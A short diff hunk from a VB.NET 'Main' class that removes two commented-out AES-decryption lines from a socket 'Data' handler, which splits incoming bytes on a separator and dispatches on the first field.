@@ -80,8 +80,6 @@ Public Class Main
 #Region "Socket Events"
 
     Public Shared Sub Data(ByVal b As Byte())
-        '   Dim E As String = AES_Decrypt(BS(b))
-        '   Dim A As String() = Split(E, SPL)
         Dim A As String() = Split(BS(b), SPL)
         Try
             Select Case A(0)
